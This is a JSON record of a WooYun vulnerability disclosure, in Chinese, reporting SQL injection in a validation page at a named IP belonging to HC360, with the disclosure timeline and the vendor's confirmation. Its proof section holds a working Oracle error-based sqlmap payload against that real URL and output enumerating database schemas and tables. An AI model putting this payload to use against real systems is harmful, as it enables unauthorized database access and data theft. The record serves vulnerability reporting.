{"id": 59822, "wybug_id": "wooyun-2013-045940", "wybug_title": "慧聪网#C段某客户端验证程序SQL注入", "wybug_corp": "慧聪网", "wybug_author": "he2des", "wybug_date": "2013-12-20 18:06", "wybug_open_date": "2014-02-03 18:06", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-03：\t细节向公众公开  简要描述： 慧聪网#C段某客户端验证程序SQL注入 详细说明：  #1:C段了一下sso.hc360.com【IP地址：118.194.34.37】 目标服务器：http://118.194.34.35/是一个对客户端提交数据进行验证的服务器.\n\n随便点击开一个页面加'发现存在注入。\nhttp://118.194.34.35/validate/over.asp?type=d&providerid=018000005652'\n\n\n   漏洞证明：  #1:漏洞证明\nPlace: GETParameter: providerid    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: type=u&providerid=023000043141' AND 8116=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(116)||CHR(118)||CHR(108)||CHR(58)||(SELECT (CASE WHEN (8116=8116) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(111)||CHR(97)||CHR(115)||CHR(58)||CHR(62))) FROM DUAL) AND 'ttxs'='ttxs---[16:25:35] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2000web application technology: ASP, Microsoft IIS 5.0back-end DBMS: Oracle[16:25:35] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes[16:25:35] [INFO] fetching database (schema) names[16:25:35] [INFO] the SQL query used returns 18 entries[16:25:36] [INFO] retrieved: ALARMDB[16:25:36] [INFO] retrieved: BUSIN[16:25:36] [INFO] retrieved: CTXSYS[16:25:36] [INFO] retrieved: DBSNMP[16:25:37] [INFO] retrieved: DMSYS[16:25:37] [INFO] retrieved: EXFSYS[16:25:37] [INFO] retrieved: HUDONG[16:25:37] [INFO] retrieved: MDSYS[16:25:37] [INFO] retrieved: OLAPSYS[16:25:38] [INFO] retrieved: ORDSYS[16:25:38] [INFO] retrieved: OUTLN[16:25:38] [INFO] retrieved: SCOTT[16:25:38] [INFO] retrieved: SYS[16:25:38] [INFO] retrieved: SYSMAN[16:25:39] [INFO] retrieved: SYSTEM[16:25:39] [INFO] retrieved: TSMSYS[16:25:39] [INFO] retrieved: WMSYS[16:25:39] [INFO] retrieved: XDBavailable databases [18]:[*] ALARMDB[*] BUSIN[*] CTXSYS[*] DBSNMP[*] DMSYS[*] EXFSYS[*] HUDONG[*] MDSYS[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] SCOTT[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] WMSYS[*] XDB[16:25:39] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 40 times[16:25:39] [INFO] Fetched data logged to text files under 'D:\\Python27\\sqlmap\\output\\118.194.34.35'\n\n\n\nDatabase: DBSNMP[21 tables]+---------------------------+| MGMT_BASELINE             || MGMT_BASELINE_SQL         || MGMT_BSLN_BASELINES       || MGMT_BSLN_DATASOURCES     || MGMT_BSLN_INTERVALS       || MGMT_BSLN_METRICS         || MGMT_BSLN_RAWDATA         || MGMT_BSLN_STATISTICS      || MGMT_BSLN_THRESHOLD_PARMS || MGMT_CAPTURE              || MGMT_CAPTURE_SQL          || MGMT_DB_FILE_GTT          || MGMT_DB_SIZE_GTT          || MGMT_HISTORY              || MGMT_HISTORY_SQL          || MGMT_LATEST               || MGMT_LATEST_SQL           || MGMT_RESPONSE_CONFIG      || MGMT_SNAPSHOT             || MGMT_SNAPSHOT_SQL         || MGMT_TEMPT_SQL            |+---------------------------+\n权限很大的哦,涉及到的数据还是挺多的啦。   修复方案：  过滤,限制IP访问。   版权声明：转载请注明来源 he2des@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2013-12-20 18:27 厂商回复： 谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}